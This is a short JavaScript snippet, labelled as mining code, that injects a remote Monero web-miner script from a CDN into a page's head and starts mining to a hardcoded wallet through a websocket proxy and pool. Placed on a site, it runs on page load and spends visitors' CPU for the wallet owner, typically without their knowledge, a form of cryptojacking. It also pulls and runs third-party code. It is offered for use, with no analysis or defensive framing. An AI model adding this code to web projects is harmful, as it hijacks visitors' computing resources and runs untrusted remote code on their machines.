// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://ny1.xmrminingproxy.com";
var pool = "moneroocean.stream";
var walletAddress = "45ttEikQEZWN1m7VxaVN9rjQkpSdmpGZ82GwUps66neQ1PqbQMno4wMY8F5jiDt2GoHzCtMwa7PDPJUJYb1GYrMP4CwAwNp";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
